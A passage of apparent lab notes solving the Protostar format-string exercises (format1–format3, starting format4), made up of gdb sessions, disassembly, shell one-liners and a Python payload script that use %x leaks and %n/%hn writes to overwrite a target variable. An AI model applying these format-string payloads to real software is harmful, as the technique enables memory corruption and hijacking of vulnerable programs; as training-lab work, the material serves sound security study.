804960c.bffff548.8048469.b7fd8304.b7fd7ff4.bffff548.8048435.bffff738.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5c8.b7eadc76.2.bffff5f4.bffff600.b7fe1848.bffff5b0.ffffffff.b7ffeff4.804824d.1.bffff5b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5c8.b21962f1.984bb4e1.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff5f4.8048450.8048440.b7ff1040.bffff5ec.b7fff8f8.2.bffff71d.bffff738.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff6fb.1f.bfffffe1.f.bffff70b.0.0.0.0.0.fd000000.e14b087e.b6c726f9.f0716a1d.6904136d.363836.0.0.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*200")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*200")
AAAA804960c.bffff548.8048469.b7fd8304.b7fd7ff4.bffff548.8048435.bffff734.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff5c8.b7eadc76.2.bffff5f4.bffff600.b7fe1848.bffff5b0.ffffffff.b7ffeff4.804824d.1.bffff5b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff5c8.89b66be1.a3e4bdf1.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff5f4.8048450.8048440.b7ff1040.bffff5ec.b7fff8f8.2.bffff719.bffff734.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff6fb.1f.bfffffe1.f.bffff70b.0.0.0.0.0.21000000.65ec0d9b.d54f3b2e.8a40adc9.69fbdefe.363836.0.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*150")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*150")
AAAA804960c.bffff5d8.8048469.b7fd8304.b7fd7ff4.bffff5d8.8048435.bffff7ca.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff658.b7eadc76.2.bffff684.bffff690.b7fe1848.bffff640.ffffffff.b7ffeff4.804824d.1.bffff640.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff658.4eb062b5.64e3d4a5.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff684.8048450.8048440.b7ff1040.bffff67c.b7fff8f8.2.bffff7af.bffff7ca.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff78b.1f.bfffffe1.f.bffff79b.0.0.0.0.0.20000000.d1ecece6.59e558ad.2a90c78e.69f64e43.363836.0.0.0.2f000000.2f74706f.746f7270.6174736f.69622f72.6f662f6e.74616d72.41410031.78254141.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*140")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*140")
AAAA804960c.bffff5f8.8048469.b7fd8304.b7fd7ff4.bffff5f8.8048435.bffff7e8.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff678.b7eadc76.2.bffff6a4.bffff6b0.b7fe1848.bffff660.ffffffff.b7ffeff4.804824d.1.bffff660.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff678.6bcabb59.419ecd49.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6a4.8048450.8048440.b7ff1040.bffff69c.b7fff8f8.2.bffff7cd.bffff7e8.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7ab.1f.bfffffe1.f.bffff7bb.0.0.0.0.0.f3000000.5db769bd.dc134a13.24218ed.6945115e.363836.0.0.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.41414141.252e7825.78252e78.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*138")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*138")
AAAA804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7ee.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.2a6cb0e.28f29d1e.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d3.bffff7ee.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.b8000000.7571e203.d538fea5.86b74d0.69604eda.363836.2f000000.2f74706f.746f7270.6174736f.69622f72.6f662f6e.74616d72.41410031.78254141.2e78252e.252e7825.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*136")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*136")
AAAA804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f4.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.1e572f33.34037923.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d9.bffff7f4.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.d6000000.87f74b3f.152670dd.34d27553.69e59cc2.363836.0.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.
Program exited normally.
(gdb) r $(python -c "print 'AAAA'+'%x.'*137")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA'+'%x.'*137")
AAAA804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f1.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.34f37a55.1ea72c45.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d6.bffff7f1.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.db000000.ad5c3b3c.7495658f.6691d926.69b07a7a.363836.0.6f2f0000.702f7470.6f746f72.72617473.6e69622f.726f662f.3174616d.41414100.2e782541.
Program exited normally.
(gdb) r $(python -c "print 'AAAA '+'%x.'*137")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAA '+'%x.'*137")
AAAA
Program exited normally.
(gdb) r $(python -c "print 'AAAAB'+'%x.'*137")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAAB'+'%x.'*137")
AAAAB804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f0.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.d775bdde.fd21ebce.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d5.bffff7f0.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.6f000000.cefdc743.df50944c.ec3c51d0.6971e913.363836.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.41414141.2e782542.
Program exited normally.
(gdb) r $(python -c "print 'AAAAB'+'%x.'*136")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAAB'+'%x.'*136")
AAAAB804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f3.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.da1a11ef.f04e47ff.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d8.bffff7f3.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.0.187772b9.ad4812fb.c5752bc6.69f6a386.363836.0.0.74706f2f.6f72702f.74736f74.622f7261.662f6e69.616d726f.41003174.
Program exited normally.
(gdb) r $(python -c "print 'AAAABBB'+'%x.'*136")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBB'+'%x.'*136")
AAAABBB804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f1.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.de208c79.f474da69.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d6.bffff7f1.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.5e000000.56febfb6.aa8310e6.ba002470.69c5eea2.363836.0.6f2f0000.702f7470.6f746f72.72617473.6e69622f.726f662f.3174616d.41414100.
Program exited normally.
(gdb) r $(python -c "print 'AAAABBBB'+'%x.'*136")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBBB'+'%x.'*136")
AAAABBBB804960c.bffff608.8048469.b7fd8304.b7fd7ff4.bffff608.8048435.bffff7f0.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff688.b7eadc76.2.bffff6b4.bffff6c0.b7fe1848.bffff670.ffffffff.b7ffeff4.804824d.1.bffff670.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff688.b53607d4.9f6251c4.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6b4.8048450.8048440.b7ff1040.bffff6ac.b7fff8f8.2.bffff7d5.bffff7f0.0.bffff991.bffff99b.bffff9b8.bffff9cc.bffff9d4.bffff9ea.bffff9fa.bffffa0d.bffffa1a.bffffa29.bffffa35.bffffa49.bffffa87.bffffa98.bfffff88.bfffff96.bfffffad.bfffffd8.0.20.b7fe2414.21.b7fe2000.10.78bfbfd.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.3e9.d.3e9.e.3e9.17.1.19.bffff7bb.1f.bfffffe1.f.bffff7cb.0.0.0.0.0.51000000.13a7f7ac.5355a56d.784159ee.69723140.363836.0.706f2f00.72702f74.736f746f.2f726174.2f6e6962.6d726f66.317461.41414141.
Program exited normally.
(gdb) r $(python -c "print 'AAAABBBB'+'%136\$x'")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBBB'+'%136\$x'")
AAAABBBB41410031
Program exited normally.
(gdb) r $(python -c "print 'AAAABBBBC'+'%136\$x'")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBBBC'+'%136\$x'")
AAAABBBBC41414100
Program exited normally.
(gdb) r $(python -c "print 'AAAABBBBCC'+'%136\$x'")
Starting program: /opt/protostar/bin/format1 $(python -c "print 'AAAABBBBCC'+'%136\$x'")
AAAABBBBCC41414141
Program exited normally.
(gdb) p &target
$1 = (int *) 0x8049638
(gdb) r $(python -c "print '\x38\x96\x04\x08BBBBCC'+'%136\$x'")
Starting program: /opt/protostar/bin/format1 $(python -c "print '\x38\x96\x04\x08BBBBCC'+'%136\$x'")
8�BBBBCC8049638
Program exited normally.
(gdb) r $(python -c "print '\x38\x96\x04\x08BBBBCC'+'%136\$n'")
Starting program: /opt/protostar/bin/format1 $(python -c "print '\x38\x96\x04\x08BBBBCC'+'%136\$n'")
8�BBBBCCyou have modified the target :)

Program exited with code 040.
```

```sh
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'DDDDBBBBC%128\$x'")
DDDDBBBBC25434242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'DDDDBBBBCC%128\$x'")
DDDDBBBBCC726f662fuser@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'DDDDBBBB%128\$x'")
DDDDBBBB25424242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'DDDDBBBBC%128\$x'")
DDDDBBBBC25434242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBBC%128\$x'")
AAAABBBBC25434242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBBCC%128\$x'")
AAAABBBBCC726f662fuser@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBB%128\$x'")
AAAABBBB25424242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBB%129\$x'")
AAAABBBB24393231user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBBCCCC%129\$x'")
AAAABBBBCCCC41003174user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAABBBBCCC%129\$x'")
AAAABBBBCCC317461user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAA BBBBCCC%129\$x'")
AAAAuser@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAA.BBBBCCC%129\$x'")
AAAA.BBBBCCC41003174user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAA.BBBB.CCC%129\$x'")
AAAA.BBBB.CCC41410031user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAA.BBBB.CCCC%129\$x'")
AAAA.BBBB.CCCC41414100user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print 'AAAA.BBBB.CCCCC%129\$x'")
AAAA.BBBB.CCCCC41414141user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x8BBBB.CCCCC%129\$n'")
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08BBBB.CCCCC%129\$n'")
Segmentation fault
user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08BBBB.CCCCC%129\$x'")
8�BBBB.CCCCC4963800user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08.BBBB.CCCCC%129\$x'")
8�.BBBB.CCCCC8049638user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print '\x38\x96\x04\x08.BBBB.CCCCC%129\$n'")
8�.BBBB.CCCCCyou have modified the target :)
```


# format2

```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x080484bb <main+0>:	push   ebp
0x080484bc <main+1>:	mov    ebp,esp
0x080484be <main+3>:	and    esp,0xfffffff0
0x080484c1 <main+6>:	call   0x8048454 <vuln>
0x080484c6 <main+11>:	mov    esp,ebp
0x080484c8 <main+13>:	pop    ebp
0x080484c9 <main+14>:	ret    
End of assembler dump.
(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x08048454 <vuln+0>:	push   ebp
0x08048455 <vuln+1>:	mov    ebp,esp
0x08048457 <vuln+3>:	sub    esp,0x218
0x0804845d <vuln+9>:	mov    eax,ds:0x80496d8
0x08048462 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
0x08048466 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
0x0804846e <vuln+26>:	lea    eax,[ebp-0x208]
0x08048474 <vuln+32>:	mov    DWORD PTR [esp],eax
0x08048477 <vuln+35>:	call   0x804835c <fgets@plt>
0x0804847c <vuln+40>:	lea    eax,[ebp-0x208]
0x08048482 <vuln+46>:	mov    DWORD PTR [esp],eax
0x08048485 <vuln+49>:	call   0x804837c <printf@plt>
0x0804848a <vuln+54>:	mov    eax,ds:0x80496e4
0x0804848f <vuln+59>:	cmp    eax,0x40
0x08048492 <vuln+62>:	jne    0x80484a2 <vuln+78>
0x08048494 <vuln+64>:	mov    DWORD PTR [esp],0x8048590
0x0804849b <vuln+71>:	call   0x804838c <puts@plt>
0x080484a0 <vuln+76>:	jmp    0x80484b9 <vuln+101>
0x080484a2 <vuln+78>:	mov    edx,DWORD PTR ds:0x80496e4
0x080484a8 <vuln+84>:	mov    eax,0x80485b0
0x080484ad <vuln+89>:	mov    DWORD PTR [esp+0x4],edx
0x080484b1 <vuln+93>:	mov    DWORD PTR [esp],eax
0x080484b4 <vuln+96>:	call   0x804837c <printf@plt>
0x080484b9 <vuln+101>:	leave  
0x080484ba <vuln+102>:	ret    
End of assembler dump.
(gdb) p &target
$1 = (int *) 0x80496e4
```

```sh
user@protostar:/opt/protostar/bin$ echo "AAAABBBBCCCC$(python -c 'print "%x."*20')"|./format2 
AAAABBBBCCCC200.b7fd8420.bffff624.41414141.42424242.43434343.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAABBBBCCCC$(python -c 'print "%x."*7')"|./format2 
AAAABBBBCCCC200.b7fd8420.bffff624.41414141.42424242.43434343.252e7825.
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%x."*7')"|./format2 
AAAA200.b7fd8420.bffff624.41414141.252e7825.78252e78.2e78252e.
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%x."*5')"|./format2 
AAAA200.b7fd8420.bffff624.41414141.252e7825.
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%x."*4')"|./format2 
AAAA200.b7fd8420.bffff624.41414141.
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%x"*4')"|./format2 
AAAA200b7fd8420bffff62441414141
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%4$x"')"|./format2 
AAAA41414141
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "AAAA$(python -c 'print "%4$64x"')"|./format2 
AAAA                                                        41414141
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "$(python -c 'print "\xe4\x96\x04\x08%4$x"')"|./format2 
��80496e4
target is 0 :(
user@protostar:/opt/protostar/bin$ echo "$(python -c 'print "\xe4\x96\x04\x08%4$n"')"|./format2 
��
target is 4 :(
user@protostar:/opt/protostar/bin$ echo "$(python -c 'print "\xe4\x96\x04\x08%10x%4$n"')"|./format2 
��       200
target is 14 :(
user@protostar:/opt/protostar/bin$ echo "$(python -c 'print "\xe4\x96\x04\x08%60x%4$n"')"|./format2 
��                                                         200
you have modified the target :)
```

# format3

```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x080484d0 <main+0>:	push   ebp
0x080484d1 <main+1>:	mov    ebp,esp
0x080484d3 <main+3>:	and    esp,0xfffffff0
0x080484d6 <main+6>:	call   0x8048467 <vuln>
0x080484db <main+11>:	mov    esp,ebp
0x080484dd <main+13>:	pop    ebp
0x080484de <main+14>:	ret    
End of assembler dump.
(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x08048467 <vuln+0>:	push   ebp
0x08048468 <vuln+1>:	mov    ebp,esp
0x0804846a <vuln+3>:	sub    esp,0x218
0x08048470 <vuln+9>:	mov    eax,ds:0x80496e8
0x08048475 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
0x08048479 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
0x08048481 <vuln+26>:	lea    eax,[ebp-0x208]
0x08048487 <vuln+32>:	mov    DWORD PTR [esp],eax
0x0804848a <vuln+35>:	call   0x804835c <fgets@plt>
0x0804848f <vuln+40>:	lea    eax,[ebp-0x208]
0x08048495 <vuln+46>:	mov    DWORD PTR [esp],eax
0x08048498 <vuln+49>:	call   0x8048454 <printbuffer>
0x0804849d <vuln+54>:	mov    eax,ds:0x80496f4
0x080484a2 <vuln+59>:	cmp    eax,0x1025544
0x080484a7 <vuln+64>:	jne    0x80484b7 <vuln+80>
0x080484a9 <vuln+66>:	mov    DWORD PTR [esp],0x80485a0
0x080484b0 <vuln+73>:	call   0x804838c <puts@plt>
0x080484b5 <vuln+78>:	jmp    0x80484ce <vuln+103>
0x080484b7 <vuln+80>:	mov    edx,DWORD PTR ds:0x80496f4
0x080484bd <vuln+86>:	mov    eax,0x80485c0
0x080484c2 <vuln+91>:	mov    DWORD PTR [esp+0x4],edx
0x080484c6 <vuln+95>:	mov    DWORD PTR [esp],eax
0x080484c9 <vuln+98>:	call   0x804837c <printf@plt>
0x080484ce <vuln+103>:	leave  
0x080484cf <vuln+104>:	ret    
End of assembler dump.
(gdb) p &target
$1 = (int *) 0x80496f4
```

0102 5544

```python
#!/usr/bin/env python

import struct

VULN=0x80496f4

PAYLOAD = ""
PAYLOAD += struct.pack("I", VULN)
PAYLOAD += struct.pack("I", VULN+2)
PAYLOAD += "%21820x" # 5544
PAYLOAD += "%12$hn"
PAYLOAD += "%43966x" # 10102
PAYLOAD += "%13$hn"

print(PAYLOAD)
```

# format4

```sh
user@protostar:/opt/protostar/bin$ objdump -TR format4 

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000      DF *UND*	00000000  GLIBC_2.0   exit
080485ec g    DO .rodata	00000004  Base        _IO_stdin_used
08049730 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080496fc R_386_GLOB_DAT    __gmon_start__
08049730 R_386_COPY        stdin
0804970c R_386_JUMP_SLOT   __gmon_start__
08049710 R_386_JUMP_SLOT   fgets
08049714 R_386_JUMP_SLOT   __libc_start_main
08049718 R_386_JUMP_SLOT   _exit
0804971c R_386_JUMP_SLOT   printf
08049720 R_386_JUMP_SLOT   puts
08049724 R_386_JUMP_SLOT   exit
```

```sh
(gdb) disassemble main 
Dump of assembler code for function main:
0x08048514 <main+0>:	push   ebp
0x08048515 <main+1>:	mov    ebp,esp
0x08048517 <main+3>:	and    esp,0xfffffff0
0x0804851a <main+6>:	call   0x80484d2 <vuln>
0x0804851f <main+11>:	mov    esp,ebp
0x08048521 <main+13>:	pop    ebp
0x08048522 <main+14>:	ret    
End of assembler dump.
(gdb) disassemble vuln 
Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:	push   ebp
0x080484d3 <vuln+1>:	mov    ebp,esp
0x080484d5 <vuln+3>:	sub    esp,0x218
0x080484db <vuln+9>:	mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:	mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:	mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:	lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:	mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:	call   0x804839c <fgets@plt>
0x080484fa <vuln+40>:	lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:	mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:	call   0x80483cc <printf@plt>
0x08048508 <vuln+54>:	mov    DWORD PTR [esp],0x1
